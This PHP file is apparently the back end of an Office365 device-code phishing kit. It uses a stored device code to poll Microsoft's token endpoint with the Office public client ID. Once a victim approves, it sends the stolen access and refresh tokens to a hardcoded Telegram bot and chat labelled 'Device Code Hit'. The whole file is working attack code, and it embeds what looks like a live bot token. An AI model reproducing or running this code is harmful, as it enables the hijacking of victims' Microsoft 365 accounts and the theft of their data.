<?php
$user_code = $_GET['code'] ?? '';
if(!$user_code) exit;

$file = 'device_'.md5($user_code).'.txt';
if(!file_exists($file)) exit;
$device_code = file_get_contents($file);

$client_id = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

$ch = curl_init('https://login.microsoftonline.com/common/oauth2/v2.0/token');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        'grant_type'  => 'urn:ietf:params:oauth:grant-type:device_code',
        'client_id'   => $client_id,
        'device_code' => $device_code
    ])
]);
$resp = json_decode(curl_exec($ch), true);
curl_close($ch);

if(isset($resp['access_token'])){
    $botToken = '8951583826:AAF4c2lvzBX8bf2ImZfGpEfa24Q8jW7-rkU';
    $chatId   = '7599379821';

    $text  = "<b>🎯 Office365 Device Code Hit</b>\n";
    $text .= "access_token:\n<code>".$resp['access_token']."</code>\n\n";
    $text .= "refresh_token:\n<code>".($resp['refresh_token']??'')."</code>\n\n";
    $text .= "expires_in: ".($resp['expires_in']??'')."\n";
    $text .= "token_type: ".($resp['token_type']??'');

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text'    => $text,
        'parse_mode' => 'HTML'
    ];
    $opts = ['http'=>['header'=>"Content-type: application/x-www-form-urlencoded\r\n",'method'=>'POST','content'=>http_build_query($data)]];
    @file_get_contents($url, false, stream_context_create($opts));

    unlink($file);
    echo 'ok';
}
?>
